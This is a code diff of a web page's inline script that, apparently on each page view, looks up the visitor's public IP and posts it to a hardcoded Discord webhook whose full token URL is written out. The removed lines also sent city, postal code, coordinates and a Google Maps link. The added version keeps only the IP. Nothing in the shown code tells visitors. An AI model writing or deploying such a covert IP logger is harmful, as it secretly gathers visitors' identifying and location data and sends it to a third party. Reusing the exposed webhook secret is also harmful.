@@ -26,34 +26,17 @@
 
     <script>
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462954759173439570/4Pa4_ofFtn8e7x1xlWX_XGS-GxwBHDYhH7IzhrEGOgsBwWszDlxNiJ0dHKg-DpnCJQ3L';
-        const GEO_API_URL = 'http://api.ipify.org/';  // Free, HTTPS, no key needed
+        const IP_API_URL = 'https://api.ipify.org?format=json';
 
         async function trackPageView() {
             try {
-                const geoResponse = await fetch(GEO_API_URL);
-                if (!geoResponse.ok) throw new Error(`HTTP error! Status: ${geoResponse.status}`);
-
-                const geoData = await geoResponse.json();
-
-                if (geoData.error) {
-                    throw new Error(geoData.reason || 'Geolocation fetch failed');
+                const ipResponse = await fetch(IP_API_URL);
+                if (!ipResponse.ok) {
+                    throw new Error(`IP API error: ${ipResponse.status}`);
                 }
 
-                const {
-                    ip = 'Unknown',
-                    city = 'Unknown',
-                    region = 'Unknown',
-                    country_name: country = 'Unknown',
-                    postal = 'Unknown',
-                    latitude,
-                    longitude
-                } = geoData;
-
-                const mapsLink = latitude && longitude 
-                    ? `https://www.google.com/maps?q=${latitude},${longitude}`
-                    : 'Location coordinates unavailable';
-
-                const locationText = `${city}, ${region}, ${country}${postal !== 'Unknown' ? ` (${postal})` : ''}`;
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip || 'Unknown';
 
                 const embedPayload = {
                     content: 'Page viewed!',
@@ -62,12 +45,10 @@
                         color: 0x00FF00,
                         fields: [
                             { name: 'IP Address', value: `\`${ip}\``, inline: true },
-                            { name: 'Location', value: locationText, inline: true },
-                            { name: 'Coordinates', value: latitude && longitude ? `${latitude}, ${longitude}` : 'N/A', inline: true },
-                            { name: 'Google Maps', value: `[View on Map](${mapsLink})`, inline: false }
+                            { name: 'Detected via', value: 'ipify.org (public IP only)', inline: false }
                         ],
                         timestamp: new Date().toISOString(),
-                        footer: { text: 'Tracked via Webhook • Powered by ipapi.co' }
+                        footer: { text: 'Tracked via Webhook' }
                     }]
                 };
 
@@ -79,9 +60,9 @@
 
             } catch (error) {
                 const errorPayload = {
-                    content: 'Page view tracking error!',
+                    content: 'Tracking error!',
                     embeds: [{
-                        title: 'VIEWED (Error)',
+                        title: 'IP Logged (Error)',
                         description: error.message,
                         color: 0xFF0000,
                         timestamp: new Date().toISOString()
